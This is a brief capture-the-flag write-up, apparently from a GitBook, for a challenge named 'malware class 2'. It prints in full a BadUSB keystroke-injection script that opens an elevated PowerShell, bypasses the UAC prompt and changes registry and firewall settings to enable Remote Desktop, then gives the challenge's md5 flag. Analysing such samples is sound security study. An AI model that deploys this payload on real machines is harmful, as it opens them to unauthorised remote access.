# Introduction to Malware

## malware class 2 <a href="#modal_title" id="modal_title"></a>

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

For this challenge, we were given a `PDF file` which contained the following

```bash
DELAY 750
WINDOWS d
DELAY 1500
WINDOWS r
DELAY 1500
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 750
LEFTARROW
ENTER
DELAY 1200
ALT y
DELAY 1200
GUI UP
DELAY 1200
STRING Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name
fDenyTSConnections -Value 0;Set-ItemProperty -Path
'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name
UserAuthentication -Value 1;netsh advfirewall firewall set rule group='remote desktop - remotefx' new
enable=Yes;netsh advfirewall firewall set rule group='remote desktop' new enable=Yes; exit
ENTER
```

Initially, I thought it was `fileless` malware since it uses powershell.

However,  that was incorrect. Later, I guessed it was `usb attack`, since it’s able to induce the install software (Privilege) by RDP connection.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ echo -n usb attack | md5sum 
01c502e467ffb2db5946ddc70c610983 -
```

Flag: 01c502e467ffb2db5946ddc70c610983

